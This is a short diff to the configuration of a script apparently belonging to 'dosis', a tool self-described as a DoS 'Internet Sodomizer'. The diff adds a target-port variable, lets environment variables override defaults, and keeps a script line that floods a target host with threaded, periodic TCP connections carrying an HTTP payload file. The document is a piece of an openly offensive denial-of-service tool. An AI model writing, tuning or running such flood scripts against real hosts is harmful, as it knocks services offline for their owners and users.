@@ -4,9 +4,14 @@
 # HTTP TCP connections.
 #
 # Configuration:
-#  THOST   - target host
+#  THOST   - target host address
+#  TPORT   - target host port
 #  THREADS - number of threads
 #  RT      - total runtime (in seconds)
+#
+#   NOTE: vars declared previously as environment variables won't be
+#         overwritten by script values. If you want that values on script take
+#         precedence over env vars, remove the preceeding ?.
 #
 # -----------------------------------------------------------------------------
 # dosis - DoS: Internet Sodomizer
@@ -29,10 +34,10 @@
 ###############################################################################
 
 # configuration
-THOST="127.0.0.1"
-TPORT="80"
-THREADS="10"
-RT="10.0"
+? THOST="127.0.0.1"
+? TPORT="80"
+? THREADS="10"
+? RT="10.0"
 
 # script
 0.0 ON [1%$THREADS] TCP DST $THOST $TPORT PAYLOAD FILE("http.payload") PERIODIC [ 1.0 ]
